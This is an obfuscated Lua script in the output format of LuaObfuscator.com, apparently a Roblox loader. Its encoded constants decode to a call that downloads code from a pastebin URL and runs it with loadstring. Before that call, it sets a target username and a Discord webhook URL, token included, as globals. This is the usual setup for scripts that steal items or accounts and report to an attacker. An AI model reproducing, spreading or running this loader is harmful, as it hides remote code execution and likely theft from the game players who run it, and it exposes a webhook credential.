--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v81=v2(v0(v30,16));if v19 then local v92=0;local v93;while true do if (v92==1) then return v93;end if (v92==0) then v93=v5(v81,v19);v19=nil;v92=1;end end else return v81;end end end);local function v20(v31,v32,v33) if v33 then local v82=(v31/((1 + 1)^(v32-1)))%((5 -3)^(((v33-((1 + 1) -(878 -(282 + 595)))) -(v32-(1 -0))) + ((1639 -(1523 + 114)) -1))) ;return v82-(v82%(620 -(499 + 56 + (91 -27)))) ;else local v83=(933 -(857 + 74))^(v32-(569 -(367 + 201))) ;return (((v31%(v83 + v83))>=v83) and 1) or (927 -(214 + 713)) ;end end local function v21() local v34=0;local v35;while true do if (v34==1) then return v35;end if (v34==(1065 -(68 + 997))) then v35=v1(v16,v18,v18);v18=v18 + (1271 -(226 + (1161 -(32 + 85)))) ;v34=4 -3 ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 1 + 1 );v18=v18 + 2 + 0 ;return (v37 * 256) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (960 -(892 + 65)) );v18=v18 + (9 -5) ;return (v41 * 16777216) + (v40 * 65536) + (v39 * (472 -216)) + v38 ;end local function v24() local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(353 -(87 + 263))) then if (v47==(180 -(67 + 113))) then if (v46==(0 + 0)) then return v48 * (0 -0) ;else local v103=(0 -0) + 0 ;while true do if ((0 -0)==v103) then v47=953 -(802 + 150) ;v45=0 -0 ;break;end end end elseif (v47==(3712 -1665)) then return ((v46==(0 + 0)) and (v48 * ((998 -(915 + 82))/0))) or (v48 * NaN) ;end return v8(v48,v47-1023 ) * (v45 + (v46/((1 + 1)^52))) ;end if (v42==(2 -1)) then v45=1 + 0 ;v46=(v20(v44,1 -0 ,1207 -(1069 + 118) ) * (((6 -2) -(440 -(145 + 293)))^32)) + v43 ;v42=3 -1 ;end if ((0 + (430 -(44 + 386)))==v42) then v43=v23();v44=v23();v42=1 -0 ;end if ((2 + 0)==v42) then v47=v20(v44,21,822 -(368 + 423) );v48=((v20(v44,100 -(1554 -(998 + 488)) )==(19 -(10 + 8))) and  -(3 -2)) or 1 ;v42=445 -(416 + 9 + 17) ;end end end local function v25(v49) local v50;if  not v49 then local v84=0 + 0 + 0 ;while true do if (v84==(772 -(201 + 571))) then v49=v23();if (v49==(1138 -(116 + 1022))) then return "";end break;end end end v50=v3(v16,v18,(v18 + v49) -1 );v18=v18 + v49 ;local v51={};for v65=4 -3 , #v50 do v51[v65]=v2(v1(v3(v50,v65,v65)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do if (v52==(5 -3)) then for v94= #"[",v23() do local v95=(function() return 0;end)();local v96=(function() return;end)();while true do if (v95==(0 + 0)) then v96=(function() return v21();end)();if (v20(v96, #"<", #"~")==(574 -(507 + 67))) then local v104=(function() return 0;end)();local v105=(function() return;end)();local v106=(function() return;end)();local v107=(function() return;end)();while true do if (3==v104) then if (v20(v106, #"-19", #"asd")~= #".") then else v107[ #".dev"]=(function() return v58[v107[ #".dev"]];end)();end v53[v94]=(function() return v107;end)();break;end if (v104~=(1750 -(1013 + 736))) then else local v127=(function() return 0 + 0 ;end)();local v128=(function() return;end)();while true do if (v127==(0 -0)) then v128=(function() return 0;end)();while true do if (v128==0) then v107=(function() return {v22(),v22(),nil,nil};end)();if (v105==(867 -(550 + 317))) then local v178=(function() return 0;end)();local v179=(function() return;end)();while true do if (v178~=0) then else v179=(function() return 0 -0 ;end)();while true do if (v179~=0) then else v107[ #"asd"]=(function() return v22();end)();v107[ #"?id="]=(function() return v22();end)();break;end end break;end end elseif (v105== #"|") then v107[ #"91("]=(function() return v23();end)();elseif (v105==2) then v107[ #"gha"]=(function() return v23() -((2 -0)^(44 -28)) ;end)();elseif (v105~= #"91(") then else local v184=(function() return 0;end)();local v185=(function() return;end)();while true do if (v184~=0) then else v185=(function() return 0;end)();while true do if (v185~=0) then else v107[ #"91("]=(function() return v23() -((287 -(134 + 151))^(1681 -(970 + 695))) ;end)();v107[ #"?id="]=(function() return v22();end)();break;end end break;end end end v128=(function() return 1;end)();end if (v128==(1 -0)) then v104=(function() return 1992 -(582 + 1408) ;end)();break;end end break;end end end if (v104~=(6 -4)) then else if (v20(v106, #"|", #"\\")== #"\\") then v107[2 -0 ]=(function() return v58[v107[7 -5 ]];end)();end if (v20(v106,2,2)~= #"!") then else v107[ #"xxx"]=(function() return v58[v107[ #"asd"]];end)();end v104=(function() return 1827 -(1195 + 629) ;end)();end if (v104~=0) then else local v129=(function() return 0;end)();while true do if (v129==(1 -0)) then v104=(function() return 1;end)();break;end if (v129~=0) then else v105=(function() return v20(v96,243 -(187 + 54) , #"-19");end)();v106=(function() return v20(v96, #"0836",6);end)();v129=(function() return 781 -(162 + 618) ;end)();end end end end end break;end end end for v97= #">",v23() do v54[v97-#"|" ]=(function() return v28();end)();end return v56;end if ( #"~"==v52) then local v88=(function() return 0 + 0 ;end)();local v89=(function() return;end)();while true do if (0~=v88) then else v89=(function() return 0 + 0 ;end)();while true do if (v89==(3 -1)) then v52=(function() return 2;end)();break;end if (v89==1) then for v109= #"[",v57 do local v110=(function() return 0;end)();local v111=(function() return;end)();local v112=(function() return;end)();local v113=(function() return;end)();while true do if (v110~=(0 -0)) then else v111=(function() return 0;end)();v112=(function() return nil;end)();v110=(function() return 1;end)();end if (1~=v110) then else v113=(function() return nil;end)();while true do if (v111==(0 + 0)) then local v171=(function() return 1636 -(1373 + 263) ;end)();local v172=(function() return;end)();while true do if (v171==0) then v172=(function() return 0;end)();while true do if ((1000 -(451 + 549))==v172) then v112=(function() return v21();end)();v113=(function() return nil;end)();v172=(function() return 1;end)();end if (v172~=1) then else v111=(function() return 1 + 0 ;end)();break;end end break;end end end if ((1 -0)~=v111) then else if (v112== #",") then v113=(function() return v21()~=0 ;end)();elseif (v112==(2 -0)) then v113=(function() return v24();end)();elseif (v112~= #"91(") then else v113=(function() return v25();end)();end v58[v109]=(function() return v113;end)();break;end end break;end end end v56[ #"19("]=(function() return v21();end)();v89=(function() return 2;end)();end if (v89~=(1384 -(746 + 638))) then else v57=(function() return v23();end)();v58=(function() return {};end)();v89=(function() return 1;end)();end end break;end end end if (v52==(0 + 0)) then local v90=(function() return 0;end)();local v91=(function() return;end)();while true do if (v90==0) then v91=(function() return 0;end)();while true do if (v91~=0) then else v53=(function() return {};end)();v54=(function() return {};end)();v91=(function() return 1 -0 ;end)();end if (v91==1) then v55=(function() return {};end)();v56=(function() return {v53,v54,nil,v55};end)();v91=(function() return 2;end)();end if (2==v91) then v52=(function() return  #"}";end)();break;end end break;end end end end end local function v29(v59,v60,v61) local v62=v59[342 -(218 + 123) ];local v63=v59[1583 -(1535 + 36 + 10) ];local v64=v59[3 + 0 ];return function(...) local v67=v62;local v68=v63;local v69=v64;local v70=v27;local v71=1;local v72= -(1 + 0);local v73={};local v74={...};local v75=v12("#",...) -(1 + 0) ;local v76={};local v77={};for v85=0 -0 ,v75 do if ((v85>=v69) or (2082==4773)) then v73[v85-v69 ]=v74[v85 + (1468 -(899 + 568)) ];else v77[v85]=v74[v85 + 1 + 0 ];end end local v78=(v75-v69) + (2 -(1 + 0)) ;local v79;local v80;while true do v79=v67[v71];v80=v79[604 -(268 + 335) ];if (v80<=(300 -(60 + 230))) then if (v80<=(576 -(426 + 146))) then if (v80<=(1 + (738 -(542 + 196)))) then if ((3244>1055) and (v80==(1456 -(282 + 1174)))) then v61[v79[814 -(569 + 242) ]]=v77[v79[5 -3 ]];else v77[v79[2]]=v79[1 + 2 ];end elseif (v80<=(1026 -(706 + 318))) then v61[v79[1254 -(721 + 530) ]]=v77[v79[1273 -(945 + 326) ]];elseif ((v80==(7 -4)) or (3313<=1778)) then v77[v79[2]]=v61[v79[3 + 0 ]];else local v132=700 -(271 + 429) ;local v133;while true do if (v132==(0 + 0)) then v133=v79[1502 -(1408 + 92) ];v77[v133]=v77[v133](v13(v77,v133 + (1087 -((987 -526) + 625)) ,v72));break;end end end elseif ((v80<=(1295 -(993 + 295))) or (1421>=2104)) then if ((1812<=3249) and (v80<=(1 + 4))) then if (v77[v79[1173 -(123 + 295 + 753) ]]==v79[2 + 2 ]) then v71=v71 + 1 + 0 ;else v71=v79[1 + 2 ];end elseif (v80==6) then local v135=v79[1 + 1 ];local v136=v77[v79[532 -(406 + 63 + 60) ]];v77[v135 + 1 ]=v136;v77[v135]=v136[v79[1773 -(630 + 1119 + 20) ]];elseif (v77[v79[1 + 1 ]]==v79[1326 -((3290 -2041) + 73) ]) then v71=v71 + 1 + 0 ;else v71=v79[1148 -(466 + 679) ];end elseif (v80<=(19 -(28 -17))) then v77[v79[(1556 -(1126 + 425)) -3 ]]();elseif (v80==(1909 -(106 + 1794))) then local v140=v79[1 + 1 ];local v141=v77[v79[1 + 2 ]];v77[v140 + 1 ]=v141;v77[v140]=v141[v79[11 -(412 -(118 + 287)) ]];else local v145=v79[5 -3 ];local v146,v147=v70(v77[v145](v13(v77,v145 + (115 -(4 + 110)) ,v79[(2300 -1713) -(57 + 527) ])));v72=(v147 + v145) -((2549 -(118 + 1003)) -(41 + 1386)) ;local v148=103 -(17 + 86) ;for v159=v145,v72 do local v160=0 + 0 ;while true do if ((1623<=1957) and (v160==(0 -0))) then v148=v148 + 1 ;v77[v159]=v146[v148];break;end end end end elseif (v80<=(43 -28)) then if (v80<=(178 -(122 + 44))) then if (v80==(32 -21)) then for v122=v79[2],v79[5 -2 ] do v77[v122]=nil;end else for v124=v79[(383 -(142 + 235)) -4 ],v79[3 + (0 -0) ] do v77[v124]=nil;end end elseif (v80<=13) then v77[v79[1 + 1 ]]();elseif (v80==14) then local v149=v79[1 + (978 -(553 + 424)) ];local v150,v151=v70(v77[v149](v13(v77,v149 + (1 -0) ,v79[68 -(30 + 35) ])));v72=(v151 + v149) -1 ;local v152=0 + 0 ;for v161=v149,v72 do local v162=0;while true do if (v162==(1257 -(1043 + 214))) then v152=v152 + (3 -2) ;v77[v161]=v150[v152];break;end end end else local v153=0;local v154;while true do if ((4412==4412) and (v153==(0 -0))) then v154=v79[1214 -(323 + 784 + 105) ];v77[v154]=v77[v154](v13(v77,v154 + (2 -1) ,v72));break;end end end elseif (v80<=(598 -(361 + 219))) then if (v80<=(336 -(53 + 0 + 267))) then v77[v79[1 + 1 ]]=v79[(243 + 173) -(7 + 8 + 398) ];elseif ((1750>=842) and (v80==(999 -(18 + 964)))) then v71=v79[(7 + 4) -8 ];else do return;end end elseif (v80<=(12 + 7)) then do return;end elseif ((4372>1850) and (v80>20)) then v71=v79[(4 -2) + (2 -1) ];else v77[v79[852 -(20 + (1858 -1028)) ]]=v61[v79[1 + 2 ]];end v71=v71 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0A3Q00028Q00026Q00F03F030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F46564B7078505A3803083Q00557365726E616D6503083Q006368696E72762Q6103073Q00576562682Q6F6B03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31323839333731373334352Q36323430322Q382F314B7973782D7673397443526267625A6178794A585255544D49583848476A6131352D6B5A575A756E72773251546D7137794F6545504359755648764A377A3038745438001A3Q0012013Q00014Q000C000100013Q0026073Q0002000100010004113Q00020001001201000100013Q0026070001000F000100020004113Q000F0001001203000200033Q001203000300043Q002009000300030005001201000500064Q000E000300054Q000F00023Q00022Q00080002000100010004113Q0019000100260700010005000100010004113Q00050001001201000200083Q001202000200073Q0012010002000A3Q001202000200093Q001201000100023Q0004113Q000500010004113Q001900010004113Q000200012Q00133Q00017Q00",v9(),...);